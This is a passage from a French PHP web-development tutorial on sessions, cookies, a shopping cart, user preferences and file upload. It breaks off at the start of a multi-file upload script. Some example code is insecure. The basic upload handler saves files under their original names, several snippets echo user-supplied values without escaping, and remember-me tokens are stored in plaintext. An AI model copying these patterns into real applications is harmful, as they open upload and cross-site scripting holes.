        &lt;a href="commandes.php"&gt;Mes commandes&lt;/a&gt; | 
        &lt;?php if ($utilisateur['role'] === 'admin'): ?&gt;
            &lt;a href="admin.php"&gt;Administration&lt;/a&gt; | 
        &lt;?php endif; ?&gt;
        &lt;a href="deconnexion.php"&gt;Se déconnecter&lt;/a&gt;
    &lt;/nav&gt;
    
    &lt;h2&gt;Vos statistiques&lt;/h2&gt;
    &lt;p&gt;Pages visitées cette session : &lt;?= $_SESSION['nombre_visites'] ?? 1 ?&gt;&lt;/p&gt;
&lt;/body&gt;
&lt;/html&gt;</code></pre>

    <h3>15.3 Les cookies - Mémoire persistante</h3>
    
    <p>Les <strong>cookies</strong> sont de petits fichiers stockés sur l'ordinateur de l'utilisateur. Ils persistent même après fermeture du navigateur.</p>

    <h4>Créer des cookies :</h4>
    <pre><code>&lt;?php
// Créer un cookie simple (expire dans 30 jours)
setcookie('nom_utilisateur', 'Jean', time() + (30 * 24 * 60 * 60));

// Cookie avec options de sécurité
setcookie('preferences', 'theme_sombre', [
    'expires' =&gt; time() + (365 * 24 * 60 * 60), // 1 an
    'path' =&gt; '/',                              // Disponible sur tout le site
    'domain' =&gt; 'monsite.com',                  // Domaine
    'secure' =&gt; true,                          // Seulement HTTPS
    'httponly' =&gt; true,                        // Pas accessible en JavaScript
    'samesite' =&gt; 'Strict'                     // Protection CSRF
]);

// Lire un cookie
if (isset($_COOKIE['nom_utilisateur'])) {
    echo "Bonjour " . $_COOKIE['nom_utilisateur'] . " !";
}

// Supprimer un cookie (définir une date passée)
setcookie('nom_utilisateur', '', time() - 3600);
?&gt;</code></pre>

    <h4>Système "Se souvenir de moi" :</h4>
    <pre><code>&lt;?php
// connexion_avec_cookie.php
session_start();

// Vérifier s'il y a un cookie "se souvenir"
if (!isset($_SESSION['user_id']) && isset($_COOKIE['remember_token'])) {
    $pdo = connecterDB();
    
    $sql = "SELECT u.id, u.nom, u.prenom, u.email, u.role 
            FROM utilisateurs u 
            JOIN remember_tokens rt ON u.id = rt.user_id 
            WHERE rt.token = :token AND rt.expires_at &gt; NOW()";
    
    $stmt = $pdo-&gt;prepare($sql);
    $stmt-&gt;execute([':token' =&gt; $_COOKIE['remember_token']]);
    $utilisateur = $stmt-&gt;fetch();
    
    if ($utilisateur) {
        // Reconnecter automatiquement
        $_SESSION['user_id'] = $utilisateur['id'];
        $_SESSION['nom_complet'] = $utilisateur['prenom'] . ' ' . $utilisateur['nom'];
        $_SESSION['email'] = $utilisateur['email'];
        $_SESSION['role'] = $utilisateur['role'];
        $_SESSION['connexion_timestamp'] = time();
    }
}

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $email = trim($_POST['email'] ?? '');
    $password = $_POST['password'] ?? '';
    $seSouvenir = isset($_POST['remember_me']);
    
    // ... vérification du login ...
    
    if ($connexionReussie) {
        // Créer la session normale
        $_SESSION['user_id'] = $utilisateur['id'];
        // ... autres données de session ...
        
        // Si "se souvenir de moi" est coché
        if ($seSouvenir) {
            $token = bin2hex(random_bytes(32));
            $expires = date('Y-m-d H:i:s', time() + (30 * 24 * 60 * 60)); // 30 jours
            
            // Sauvegarder le token en base
            $sql = "INSERT INTO remember_tokens (user_id, token, expires_at) 
                    VALUES (:user_id, :token, :expires) 
                    ON DUPLICATE KEY UPDATE token = :token, expires_at = :expires";
            
            $stmt = $pdo-&gt;prepare($sql);
            $stmt-&gt;execute([
                ':user_id' =&gt; $utilisateur['id'],
                ':token' =&gt; $token,
                ':expires' =&gt; $expires
            ]);
            
            // Créer le cookie
            setcookie('remember_token', $token, [
                'expires' =&gt; time() + (30 * 24 * 60 * 60),
                'path' =&gt; '/',
                'httponly' =&gt; true,
                'secure' =&gt; true,
                'samesite' =&gt; 'Strict'
            ]);
        }
        
        header('Location: dashboard.php');
        exit;
    }
}
?&gt;</code></pre>

    <h3>15.4 Panier d'achat avec sessions</h3>
    
    <h4>Classe de gestion du panier :</h4>
    <pre><code>&lt;?php
// Panier.php
class Panier {
    public function __construct() {
        session_start();
        if (!isset($_SESSION['panier'])) {
            $_SESSION['panier'] = [];
        }
    }
    
    public function ajouter($produitId, $quantite = 1) {
        $produitId = (int)$produitId;
        $quantite = (int)$quantite;
        
        if ($quantite &lt;= 0) return false;
        
        if (isset($_SESSION['panier'][$produitId])) {
            $_SESSION['panier'][$produitId] += $quantite;
        } else {
            $_SESSION['panier'][$produitId] = $quantite;
        }
        
        return true;
    }
    
    public function modifier($produitId, $quantite) {
        $produitId = (int)$produitId;
        $quantite = (int)$quantite;
        
        if ($quantite &lt;= 0) {
            $this-&gt;supprimer($produitId);
        } else {
            $_SESSION['panier'][$produitId] = $quantite;
        }
    }
    
    public function supprimer($produitId) {
        $produitId = (int)$produitId;
        unset($_SESSION['panier'][$produitId]);
    }
    
    public function vider() {
        $_SESSION['panier'] = [];
    }
    
    public function obtenirContenu() {
        return $_SESSION['panier'];
    }
    
    public function nombreArticles() {
        return array_sum($_SESSION['panier']);
    }
    
    public function estVide() {
        return empty($_SESSION['panier']);
    }
    
    public function calculerTotal($pdo) {
        if ($this-&gt;estVide()) return 0;
        
        $ids = array_keys($_SESSION['panier']);
        $placeholders = str_repeat('?,', count($ids) - 1) . '?';
        
        $sql = "SELECT id, nom, prix FROM produits WHERE id IN ($placeholders)";
        $stmt = $pdo-&gt;prepare($sql);
        $stmt-&gt;execute($ids);
        $produits = $stmt-&gt;fetchAll(PDO::FETCH_ASSOC);
        
        $total = 0;
        $details = [];
        
        foreach ($produits as $produit) {
            $quantite = $_SESSION['panier'][$produit['id']];
            $sousTotal = $produit['prix'] * $quantite;
            $total += $sousTotal;
            
            $details[] = [
                'produit' =&gt; $produit,
                'quantite' =&gt; $quantite,
                'sous_total' =&gt; $sousTotal
            ];
        }
        
        return [
            'total' =&gt; $total,
            'details' =&gt; $details
        ];
    }
}

// Utilisation du panier
$panier = new Panier();

// Ajouter un produit
if (isset($_POST['ajouter_panier'])) {
    $produitId = $_POST['produit_id'];
    $quantite = $_POST['quantite'] ?? 1;
    
    if ($panier-&gt;ajouter($produitId, $quantite)) {
        echo "✅ Produit ajouté au panier !";
    }
}

// Afficher le contenu du panier
echo "&lt;h3&gt;🛒 Mon panier (" . $panier-&gt;nombreArticles() . " articles)&lt;/h3&gt;";

if (!$panier-&gt;estVide()) {
    $pdo = connecterDB();
    $infoPanier = $panier-&gt;calculerTotal($pdo);
    
    foreach ($infoPanier['details'] as $item) {
        echo "&lt;div&gt;";
        echo $item['produit']['nom'] . " x " . $item['quantite'];
        echo " = " . number_format($item['sous_total'], 2) . "€";
        echo "&lt;/div&gt;";
    }
    
    echo "&lt;p&gt;&lt;strong&gt;Total : " . number_format($infoPanier['total'], 2) . "€&lt;/strong&gt;&lt;/p&gt;";
} else {
    echo "&lt;p&gt;Votre panier est vide.&lt;/p&gt;";
}
?&gt;</code></pre>

    <h3>15.5 Gestion des préférences utilisateur</h3>
    
    <pre><code>&lt;?php
// preferences.php
class PreferencesUtilisateur {
    
    public function sauvegarderPreference($cle, $valeur, $dureeJours = 365) {
        setcookie("pref_$cle", $valeur, [
            'expires' =&gt; time() + ($dureeJours * 24 * 60 * 60),
            'path' =&gt; '/',
            'httponly' =&gt; true,
            'secure' =&gt; isset($_SERVER['HTTPS']),
            'samesite' =&gt; 'Lax'
        ]);
    }
    
    public function obtenirPreference($cle, $defaut = null) {
        return $_COOKIE["pref_$cle"] ?? $defaut;
    }
    
    public function supprimerPreference($cle) {
        setcookie("pref_$cle", '', time() - 3600);
    }
    
    public function appliquerTheme() {
        $theme = $this-&gt;obtenirPreference('theme', 'clair');
        
        if ($theme === 'sombre') {
            echo "&lt;style&gt;
                body { background: #2d3748; color: #e2e8f0; }
                .card { background: #4a5568; border-color: #718096; }
            &lt;/style&gt;";
        }
    }
    
    public function obtenirLangue() {
        // Priorité : 1. Cookie, 2. Session, 3. Navigateur, 4. Défaut
        $langue = $this-&gt;obtenirPreference('langue');
        
        if (!$langue && isset($_SESSION['langue'])) {
            $langue = $_SESSION['langue'];
        }
        
        if (!$langue && isset($_SERVER['HTTP_ACCEPT_LANGUAGE'])) {
            $languesNavigateur = explode(',', $_SERVER['HTTP_ACCEPT_LANGUAGE']);
            $langue = substr($languesNavigateur[0], 0, 2);
        }
        
        return in_array($langue, ['fr', 'en', 'es']) ? $langue : 'fr';
    }
}

// Utilisation
$prefs = new PreferencesUtilisateur();

// Traitement des préférences
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if (isset($_POST['theme'])) {
        $prefs-&gt;sauvegarderPreference('theme', $_POST['theme']);
    }
    
    if (isset($_POST['langue'])) {
        $prefs-&gt;sauvegarderPreference('langue', $_POST['langue']);
        $_SESSION['langue'] = $_POST['langue'];
    }
    
    echo "✅ Préférences sauvegardées !";
}

// Appliquer le thème
$prefs-&gt;appliquerTheme();
?&gt;

&lt;!DOCTYPE html&gt;
&lt;html lang="&lt;?= $prefs-&gt;obtenirLangue() ?&gt;"&gt;
&lt;head&gt;
    &lt;title&gt;Mes préférences&lt;/title&gt;
&lt;/head&gt;
&lt;body&gt;
    &lt;h2&gt;⚙️ Mes préférences&lt;/h2&gt;
    
    &lt;form method="POST"&gt;
        &lt;div&gt;
            &lt;label&gt;Thème :&lt;/label&gt;
            &lt;select name="theme"&gt;
                &lt;option value="clair" &lt;?= $prefs-&gt;obtenirPreference('theme', 'clair') === 'clair' ? 'selected' : '' ?&gt;&gt;Clair&lt;/option&gt;
                &lt;option value="sombre" &lt;?= $prefs-&gt;obtenirPreference('theme') === 'sombre' ? 'selected' : '' ?&gt;&gt;Sombre&lt;/option&gt;
            &lt;/select&gt;
        &lt;/div&gt;
        
        &lt;div&gt;
            &lt;label&gt;Langue :&lt;/label&gt;
            &lt;select name="langue"&gt;
                &lt;option value="fr" &lt;?= $prefs-&gt;obtenirLangue() === 'fr' ? 'selected' : '' ?&gt;&gt;Français&lt;/option&gt;
                &lt;option value="en" &lt;?= $prefs-&gt;obtenirLangue() === 'en' ? 'selected' : '' ?&gt;&gt;English&lt;/option&gt;
                &lt;option value="es" &lt;?= $prefs-&gt;obtenirLangue() === 'es' ? 'selected' : '' ?&gt;&gt;Español&lt;/option&gt;
            &lt;/select&gt;
        &lt;/div&gt;
        
        &lt;button type="submit"&gt;💾 Sauvegarder&lt;/button&gt;
    &lt;/form&gt;
    
    &lt;p&gt;Thème actuel : &lt;strong&gt;&lt;?= $prefs-&gt;obtenirPreference('theme', 'clair') ?&gt;&lt;/strong&gt;&lt;/p&gt;
    &lt;p&gt;Langue actuelle : &lt;strong&gt;&lt;?= $prefs-&gt;obtenirLangue() ?&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;/body&gt;
&lt;/html&gt;</code></pre>

    <h3>15.6 Exercice pratique : Site e-commerce avec sessions</h3>
    
    <p><strong>Objectif :</strong> Créer un mini site e-commerce avec authentification, panier et préférences.</p>
    
    <p><strong>Fonctionnalités à implémenter :</strong></p>
    <ol>
        <li>Inscription et connexion avec sessions</li>
        <li>Catalogue de produits</li>
        <li>Système de panier complet</li>
        <li>Pages protégées (profil, commandes)</li>
        <li>Préférences utilisateur (thème, langue)</li>
        <li>Fonction "Se souvenir de moi"</li>
        <li>Statistiques de session (pages vues, temps passé)</li>
    </ol>

    <details>
        <summary><strong>💡 Voir la structure de solution</strong></summary>
       </details>
       </section>
       <section>
        
<!-- Partie 16: Upload de fichiers en PHP -->
<section class="part16">
    <h2>16. Upload de fichiers en PHP</h2>
    
    <p>L'upload de fichiers est comme permettre à vos visiteurs de <strong>déposer des documents</strong> dans votre bureau numérique. Photos de profil, CV, documents administratifs... Cette fonctionnalité est essentielle pour de nombreux sites web, mais elle doit être <strong>parfaitement sécurisée</strong> pour éviter que des pirates y glissent des virus !</p>

    <p>Nous allons apprendre à gérer tous types de fichiers : images, documents, archives... en toute sécurité.</p>

    <h3>16.1 Les bases de l'upload en PHP</h3>
    
    <p>Pour qu'un formulaire HTML puisse envoyer des fichiers, il faut respecter <strong>3 règles importantes</strong> :</p>

    <div style="background: #f8f9fa; padding: 15px; border-radius: 8px; margin: 15px 0;">
        <ol>
            <li><strong>Méthode POST :</strong> <code>method="POST"</code></li>
            <li><strong>Encodage spécial :</strong> <code>enctype="multipart/form-data"</code></li>
            <li><strong>Champ file :</strong> <code>&lt;input type="file"&gt;</code></li>
        </ol>
    </div>

    <h4>Formulaire d'upload simple :</h4>
    <pre><code>&lt;!-- upload_simple.html --&gt;
&lt;form method="POST" action="traiter_upload.php" enctype="multipart/form-data"&gt;
    &lt;div&gt;
        &lt;label for="fichier"&gt;Choisir un fichier :&lt;/label&gt;
        &lt;input type="file" id="fichier" name="fichier" required&gt;
    &lt;/div&gt;
    
    &lt;div&gt;
        &lt;label for="description"&gt;Description :&lt;/label&gt;
        &lt;input type="text" id="description" name="description"&gt;
    &lt;/div&gt;
    
    &lt;button type="submit"&gt;📤 Envoyer le fichier&lt;/button&gt;
&lt;/form&gt;</code></pre>

    <h4>Traitement de base côté PHP :</h4>
    <pre><code>&lt;?php
// traiter_upload.php
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['fichier'])) {
    $fichier = $_FILES['fichier'];
    
    // Informations sur le fichier uploadé
    echo "&lt;h3&gt;📄 Informations du fichier :&lt;/h3&gt;";
    echo "&lt;p&gt;&lt;strong&gt;Nom original :&lt;/strong&gt; " . $fichier['name'] . "&lt;/p&gt;";
    echo "&lt;p&gt;&lt;strong&gt;Type MIME :&lt;/strong&gt; " . $fichier['type'] . "&lt;/p&gt;";
    echo "&lt;p&gt;&lt;strong&gt;Taille :&lt;/strong&gt; " . number_format($fichier['size'] / 1024, 2) . " Ko&lt;/p&gt;";
    echo "&lt;p&gt;&lt;strong&gt;Fichier temporaire :&lt;/strong&gt; " . $fichier['tmp_name'] . "&lt;/p&gt;";
    echo "&lt;p&gt;&lt;strong&gt;Code d'erreur :&lt;/strong&gt; " . $fichier['error'] . "&lt;/p&gt;";
    
    // Vérifier qu'il n'y a pas d'erreur
    if ($fichier['error'] === UPLOAD_ERR_OK) {
        echo "&lt;p style='color: green;'&gt;✅ Fichier reçu sans erreur !&lt;/p&gt;";
        
        // Définir le dossier de destination
        $dossierUpload = 'uploads/';
        if (!is_dir($dossierUpload)) {
            mkdir($dossierUpload, 0755, true);
        }
        
        // Déplacer le fichier temporaire vers sa destination
        $destination = $dossierUpload . $fichier['name'];
        if (move_uploaded_file($fichier['tmp_name'], $destination)) {
            echo "&lt;p style='color: green;'&gt;✅ Fichier sauvegardé : $destination&lt;/p&gt;";
        } else {
            echo "&lt;p style='color: red;'&gt;❌ Erreur lors de la sauvegarde&lt;/p&gt;";
        }
    } else {
        echo "&lt;p style='color: red;'&gt;❌ Erreur d'upload : " . $fichier['error'] . "&lt;/p&gt;";
    }
} else {
    echo "&lt;p&gt;Aucun fichier reçu.&lt;/p&gt;";
}
?&gt;</code></pre>

    <h3>16.2 Gestion des erreurs d'upload</h3>
    
    <p>PHP nous donne un code d'erreur pour chaque upload. Apprenons à les décoder pour informer correctement nos utilisateurs !</p>

    <h4>Fonction de décodage des erreurs :</h4>
    <pre><code>&lt;?php
function obtenirMessageErreur($codeErreur) {
    switch ($codeErreur) {
        case UPLOAD_ERR_OK:
            return "✅ Aucune erreur";
            
        case UPLOAD_ERR_INI_SIZE:
            return "❌ Le fichier dépasse la taille maximale autorisée dans php.ini";
            
        case UPLOAD_ERR_FORM_SIZE:
            return "❌ Le fichier dépasse la taille maximale du formulaire";
            
        case UPLOAD_ERR_PARTIAL:
            return "❌ Le fichier n'a été que partiellement uploadé";
            
        case UPLOAD_ERR_NO_FILE:
            return "⚠️ Aucun fichier n'a été uploadé";
            
        case UPLOAD_ERR_NO_TMP_DIR:
            return "❌ Dossier temporaire manquant";
            
        case UPLOAD_ERR_CANT_WRITE:
            return "❌ Impossible d'écrire sur le disque";
            
        case UPLOAD_ERR_EXTENSION:
            return "❌ Upload arrêté par une extension PHP";
            
        default:
            return "❌ Erreur inconnue";
    }
}

// Utilisation
if (isset($_FILES['fichier'])) {
    $fichier = $_FILES['fichier'];
    $messageErreur = obtenirMessageErreur($fichier['error']);
    echo "&lt;p&gt;$messageErreur&lt;/p&gt;";
}
?&gt;</code></pre>

    <h3>16.3 Validation et sécurisation complètes</h3>
    
    <p>⚠️ <strong>ATTENTION :</strong> Accepter n'importe quel fichier est <strong>EXTRÊMEMENT DANGEREUX</strong> ! Un pirate pourrait uploader un script malveillant et prendre le contrôle de votre serveur.</p>

    <h4>Classe d'upload sécurisée :</h4>
    <pre><code>&lt;?php
class UploadSecurise {
    private $typesAutorises = [
        // Images
        'image/jpeg' =&gt; ['jpg', 'jpeg'],
        'image/png' =&gt; ['png'],
        'image/gif' =&gt; ['gif'],
        'image/webp' =&gt; ['webp'],
        
        // Documents
        'application/pdf' =&gt; ['pdf'],
        'text/plain' =&gt; ['txt'],
        'application/msword' =&gt; ['doc'],
        'application/vnd.openxmlformats-officedocument.wordprocessingml.document' =&gt; ['docx'],
        
        // Archives
        'application/zip' =&gt; ['zip'],
        'application/x-rar-compressed' =&gt; ['rar']
    ];
    
    private $tailleMax = 10485760; // 10 MB
    private $dossierUpload = 'uploads/';
    
    public function __construct($dossierUpload = null, $tailleMax = null) {
        if ($dossierUpload) $this-&gt;dossierUpload = rtrim($dossierUpload, '/') . '/';
        if ($tailleMax) $this-&gt;tailleMax = $tailleMax;
        
        // Créer le dossier si nécessaire
        if (!is_dir($this-&gt;dossierUpload)) {
            mkdir($this-&gt;dossierUpload, 0755, true);
        }
    }
    
    public function valider($fichier) {
        $erreurs = [];
        
        // Vérifier les erreurs d'upload
        if ($fichier['error'] !== UPLOAD_ERR_OK) {
            $erreurs[] = $this-&gt;obtenirMessageErreur($fichier['error']);
            return $erreurs;
        }
        
        // Vérifier la taille
        if ($fichier['size'] &gt; $this-&gt;tailleMax) {
            $erreurs[] = "Fichier trop volumineux (max: " . 
                        number_format($this-&gt;tailleMax / 1024 / 1024, 1) . " MB)";
        }
        
        if ($fichier['size'] == 0) {
            $erreurs[] = "Le fichier est vide";
        }
        
        // Vérifier le type MIME
        $typeMime = mime_content_type($fichier['tmp_name']);
        if (!array_key_exists($typeMime, $this-&gt;typesAutorises)) {
            $erreurs[] = "Type de fichier non autorisé ($typeMime)";
        }
        
        // Vérifier l'extension
        $extension = strtolower(pathinfo($fichier['name'], PATHINFO_EXTENSION));
        if (!in_array($extension, $this-&gt;typesAutorises[$typeMime] ?? [])) {
            $erreurs[] = "Extension de fichier non autorisée ($extension)";
        }
        
        // Vérifications spécifiques aux images
        if (strpos($typeMime, 'image/') === 0) {
            $infoImage = getimagesize($fichier['tmp_name']);
            if ($infoImage === false) {
                $erreurs[] = "Le fichier n'est pas une image valide";
            } else {
                // Vérifier les dimensions
                if ($infoImage[0] &gt; 5000 || $infoImage[1] &gt; 5000) {
                    $erreurs[] = "Image trop grande (max: 5000x5000 pixels)";
                }
            }
        }
        
        // Vérifier le nom de fichier
        if (!$this-&gt;validerNomFichier($fichier['name'])) {
            $erreurs[] = "Nom de fichier invalide";
        }
        
        return $erreurs;
    }
    
    public function uploader($fichier, $nouveauNom = null) {
        // Valider d'abord
        $erreurs = $this-&gt;valider($fichier);
        if (!empty($erreurs)) {
            return ['succes' =&gt; false, 'erreurs' =&gt; $erreurs];
        }
        
        // Générer un nom sécurisé
        if ($nouveauNom) {
            $nomFichier = $this-&gt;securiserNom($nouveauNom);
        } else {
            $extension = strtolower(pathinfo($fichier['name'], PATHINFO_EXTENSION));
            $nomFichier = uniqid() . '_' . time() . '.' . $extension;
        }
        
        $cheminComplet = $this-&gt;dossierUpload . $nomFichier;
        
        // Déplacer le fichier
        if (move_uploaded_file($fichier['tmp_name'], $cheminComplet)) {
            return [
                'succes' =&gt; true,
                'nom_fichier' =&gt; $nomFichier,
                'chemin_complet' =&gt; $cheminComplet,
                'taille' =&gt; $fichier['size'],
                'type' =&gt; mime_content_type($cheminComplet)
            ];
        } else {
            return ['succes' =&gt; false, 'erreurs' =&gt; ['Erreur lors de la sauvegarde']];
        }
    }
    
    private function validerNomFichier($nom) {
        // Caractères interdits dans les noms de fichiers
        $caracteresInterdits = ['/', '\\', ':', '*', '?', '"', '&lt;', '&gt;', '|'];
        
        foreach ($caracteresInterdits as $caractere) {
            if (strpos($nom, $caractere) !== false) {
                return false;
            }
        }
        
        // Noms de fichiers interdits sous Windows
        $nomsInterdits = ['CON', 'PRN', 'AUX', 'NUL', 'COM1', 'COM2', 'LPT1', 'LPT2'];
        $nomSansExtension = pathinfo($nom, PATHINFO_FILENAME);
        
        return !in_array(strtoupper($nomSansExtension), $nomsInterdits);
    }
    
    private function securiserNom($nom) {
        // Supprimer les caractères dangereux
        $nom = preg_replace('/[^a-zA-Z0-9._-]/', '_', $nom);
        
        // Éviter les noms trop longs
        if (strlen($nom) &gt; 100) {
            $extension = pathinfo($nom, PATHINFO_EXTENSION);
            $nom = substr($nom, 0, 100 - strlen($extension) - 1) . '.' . $extension;
        }
        
        return $nom;
    }
    
    private function obtenirMessageErreur($codeErreur) {
        $messages = [
            UPLOAD_ERR_OK =&gt; "Aucune erreur",
            UPLOAD_ERR_INI_SIZE =&gt; "Fichier trop volumineux (limite serveur)",
            UPLOAD_ERR_FORM_SIZE =&gt; "Fichier trop volumineux (limite formulaire)",
            UPLOAD_ERR_PARTIAL =&gt; "Upload incomplet",
            UPLOAD_ERR_NO_FILE =&gt; "Aucun fichier sélectionné",
            UPLOAD_ERR_NO_TMP_DIR =&gt; "Dossier temporaire manquant",
            UPLOAD_ERR_CANT_WRITE =&gt; "Erreur d'écriture disque",
            UPLOAD_ERR_EXTENSION =&gt; "Upload bloqué par une extension"
        ];
        
        return $messages[$codeErreur] ?? "Erreur inconnue";
    }
}
?&gt;</code></pre>

    <h3>16.4 Upload d'images avec redimensionnement</h3>
    
    <p>Pour les images, on veut souvent créer des <strong>miniatures</strong> ou redimensionner automatiquement pour économiser l'espace disque.</p>

    <h4>Classe de traitement d'images :</h4>
    <pre><code>&lt;?php
class TraitementImage extends UploadSecurise {
    
    public function redimensionner($cheminSource, $cheminDestination, $largeurMax, $hauteurMax = null) {
        if (!$hauteurMax) $hauteurMax = $largeurMax;
        
        // Obtenir les informations de l'image
        $infoImage = getimagesize($cheminSource);
        if (!$infoImage) return false;
        
        $largeurOriginale = $infoImage[0];
        $hauteurOriginale = $infoImage[1];
        $typeImage = $infoImage[2];
        
        // Calculer les nouvelles dimensions
        $ratio = min($largeurMax / $largeurOriginale, $hauteurMax / $hauteurOriginale);
        $nouvelleLargeur = (int)($largeurOriginale * $ratio);
        $nouvelleHauteur = (int)($hauteurOriginale * $ratio);
        
        // Créer l'image source selon le type
        switch ($typeImage) {
            case IMAGETYPE_JPEG:
                $imageSource = imagecreatefromjpeg($cheminSource);
                break;
            case IMAGETYPE_PNG:
                $imageSource = imagecreatefrompng($cheminSource);
                break;
            case IMAGETYPE_GIF:
                $imageSource = imagecreatefromgif($cheminSource);
                break;
            default:
                return false;
        }
        
        if (!$imageSource) return false;
        
        // Créer la nouvelle image
        $nouvelleImage = imagecreatetruecolor($nouvelleLargeur, $nouvelleHauteur);
        
        // Préserver la transparence pour PNG et GIF
        if ($typeImage == IMAGETYPE_PNG || $typeImage == IMAGETYPE_GIF) {
            imagealphablending($nouvelleImage, false);
            imagesavealpha($nouvelleImage, true);
            $transparent = imagecolorallocatealpha($nouvelleImage, 255, 255, 255, 127);
            imagefill($nouvelleImage, 0, 0, $transparent);
        }
        
        // Redimensionner
        imagecopyresampled(
            $nouvelleImage, $imageSource,
            0, 0, 0, 0,
            $nouvelleLargeur, $nouvelleHauteur,
            $largeurOriginale, $hauteurOriginale
        );
        
        // Sauvegarder selon le type
        $resultat = false;
        switch ($typeImage) {
            case IMAGETYPE_JPEG:
                $resultat = imagejpeg($nouvelleImage, $cheminDestination, 85);
                break;
            case IMAGETYPE_PNG:
                $resultat = imagepng($nouvelleImage, $cheminDestination, 8);
                break;
            case IMAGETYPE_GIF:
                $resultat = imagegif($nouvelleImage, $cheminDestination);
                break;
        }
        
        // Nettoyer la mémoire
        imagedestroy($imageSource);
        imagedestroy($nouvelleImage);
        
        return $resultat;
    }
    
    public function creerMiniature($cheminSource, $dossierMiniatures, $taille = 150) {
        $nomFichier = basename($cheminSource);
        $extension = pathinfo($nomFichier, PATHINFO_EXTENSION);
        $nomSansExtension = pathinfo($nomFichier, PATHINFO_FILENAME);
        
        $nomMiniature = $nomSansExtension . '_thumb.' . $extension;
        $cheminMiniature = rtrim($dossierMiniatures, '/') . '/' . $nomMiniature;
        
        // Créer le dossier si nécessaire
        if (!is_dir($dossierMiniatures)) {
            mkdir($dossierMiniatures, 0755, true);
        }
        
        if ($this-&gt;redimensionner($cheminSource, $cheminMiniature, $taille, $taille)) {
            return $cheminMiniature;
        }
        
        return false;
    }
    
    public function uploaderImageAvecMiniature($fichier, $creerMiniature = true) {
        // Upload normal
        $resultat = $this-&gt;uploader($fichier);
        
        if ($resultat['succes'] && $creerMiniature) {
            // Créer une miniature
            $dossierMiniatures = $this-&gt;dossierUpload . 'miniatures/';
            $cheminMiniature = $this-&gt;creerMiniature($resultat['chemin_complet'], $dossierMiniatures);
            
            if ($cheminMiniature) {
                $resultat['miniature'] = $cheminMiniature;
            }
        }
        
        return $resultat;
    }
}

// Utilisation
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['image'])) {
    $upload = new TraitementImage('uploads/images/', 5 * 1024 * 1024); // 5 MB max
    
    $resultat = $upload-&gt;uploaderImageAvecMiniature($_FILES['image']);
    
    if ($resultat['succes']) {
        echo "&lt;h3&gt;✅ Image uploadée avec succès !&lt;/h3&gt;";
        echo "&lt;p&gt;&lt;strong&gt;Fichier :&lt;/strong&gt; " . $resultat['nom_fichier'] . "&lt;/p&gt;";
        echo "&lt;p&gt;&lt;strong&gt;Taille :&lt;/strong&gt; " . number_format($resultat['taille'] / 1024, 2) . " Ko&lt;/p&gt;";
        
        // Afficher l'image et sa miniature
        echo "&lt;div style='display: flex; gap: 20px; margin: 20px 0;'&gt;";
        echo "&lt;div&gt;";
        echo "&lt;h4&gt;Image originale :&lt;/h4&gt;";
        echo "&lt;img src='" . $resultat['chemin_complet'] . "' style='max-width: 300px; max-height: 300px;'&gt;";
        echo "&lt;/div&gt;";
        
        if (isset($resultat['miniature'])) {
            echo "&lt;div&gt;";
            echo "&lt;h4&gt;Miniature :&lt;/h4&gt;";
            echo "&lt;img src='" . $resultat['miniature'] . "' style='border: 1px solid #ddd;'&gt;";
            echo "&lt;/div&gt;";
        }
        echo "&lt;/div&gt;";
        
    } else {
        echo "&lt;div style='background: #f8d7da; padding: 15px; border-radius: 5px;'&gt;";
        echo "&lt;h3&gt;❌ Erreurs d'upload :&lt;/h3&gt;";
        foreach ($resultat['erreurs'] as $erreur) {
            echo "&lt;p&gt;• $erreur&lt;/p&gt;";
        }
        echo "&lt;/div&gt;";
    }
}
?&gt;</code></pre>

    <h3>16.5 Upload multiple et barre de progression</h3>
    
    <h4>Formulaire pour upload multiple :</h4>
    <pre><code>&lt;!-- upload_multiple.html --&gt;
&lt;!DOCTYPE html&gt;
&lt;html&gt;
&lt;head&gt;
    &lt;title&gt;Upload Multiple&lt;/title&gt;
    &lt;style&gt;
        .upload-zone {
            border: 2px dashed #ccc;
            border-radius: 10px;
            padding: 50px;
            text-align: center;
            background: #fafafa;
            cursor: pointer;
            transition: all 0.3s;
        }
        .upload-zone:hover {
            border-color: #007bff;
            background: #f0f8ff;
        }
        .file-list {
            margin: 20px 0;
        }
        .file-item {
            background: #f8f9fa;
            padding: 10px;
            margin: 5px 0;
            border-radius: 5px;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        .progress-bar {
            width: 100%;
            height: 20px;
            background: #e9ecef;
            border-radius: 10px;
            overflow: hidden;
            margin: 10px 0;
        }
        .progress-fill {
            height: 100%;
            background: #28a745;
            width: 0%;
            transition: width 0.3s;
        }
    &lt;/style&gt;
&lt;/head&gt;
&lt;body&gt;
    &lt;h2&gt;📤 Upload Multiple de Fichiers&lt;/h2&gt;
    
    &lt;form id="uploadForm" enctype="multipart/form-data"&gt;
        &lt;div class="upload-zone" onclick="document.getElementById('fichiers').click()"&gt;
            &lt;p&gt;🗂️ &lt;strong&gt;Cliquez ici ou glissez vos fichiers&lt;/strong&gt;&lt;/p&gt;
            &lt;p&gt;Formats acceptés : JPG, PNG, PDF, DOC (max 10 MB par fichier)&lt;/p&gt;
            &lt;input type="file" id="fichiers" name="fichiers[]" multiple style="display: none;" accept=".jpg,.jpeg,.png,.pdf,.doc,.docx"&gt;
        &lt;/div&gt;
        
        &lt;div id="fileList" class="file-list"&gt;&lt;/div&gt;
        
        &lt;div id="progressContainer" style="display: none;"&gt;
            &lt;p&gt;Progression de l'upload :&lt;/p&gt;
            &lt;div class="progress-bar"&gt;
                &lt;div id="progressBar" class="progress-fill"&gt;&lt;/div&gt;
            &lt;/div&gt;
            &lt;p id="progressText"&gt;0% - 0/0 fichiers&lt;/p&gt;
        &lt;/div&gt;
        
        &lt;button type="button" id="uploadBtn" style="display: none; margin: 20px 0; padding: 15px 30px; background: #007bff; color: white; border: none; border-radius: 5px; cursor: pointer;"&gt;
            🚀 Lancer l'upload
        &lt;/button&gt;
    &lt;/form&gt;
    
    &lt;div id="results"&gt;&lt;/div&gt;
    
    &lt;script&gt;
        const fichiersInput = document.getElementById('fichiers');
        const fileList = document.getElementById('fileList');
        const uploadBtn = document.getElementById('uploadBtn');
        const progressContainer = document.getElementById('progressContainer');
        const progressBar = document.getElementById('progressBar');
        const progressText = document.getElementById('progressText');
        const results = document.getElementById('results');
        
